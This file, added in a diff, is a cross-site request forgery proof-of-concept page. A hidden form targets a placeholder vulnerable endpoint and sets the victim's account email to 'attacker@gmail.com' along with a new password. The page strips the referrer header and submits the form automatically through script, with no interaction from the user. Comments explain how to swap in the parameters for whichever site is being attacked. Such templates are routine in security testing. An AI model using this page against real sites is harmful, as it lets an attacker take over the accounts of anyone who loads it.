@@ -1,0 +1,28 @@
+<!-- Type ! Then Click Tab to Create Basic HTML Page -->
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <!-- Telling the Browser to not include a referrer header in the HTTP Request -->
+    <meta name="referrer" content="no-referrer" />
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Spoofed Title</title>
+  </head>
+  <body>
+    <!--Those <input> name attributes Value Changes Depending on The Parameters You Wanna Attack-->
+    <form method="post" id="Pass" action="http://website.com/vuln-endpoint">
+      <input type="hidden" name="email" value="attacker@gmail.com" />
+
+      <input type="hidden" name="newPassword" value="NewPassword" />
+
+      <input type="hidden" name="confPassword" value="NewPassword" />
+
+      <input type="hidden" name="action" value="change" />
+    </form>
+
+    <script>
+      document.forms["Pass"].submit(); // For AutoSubmitting The Form Without User's Interaction
+    </script>
+  </body>
+</html>
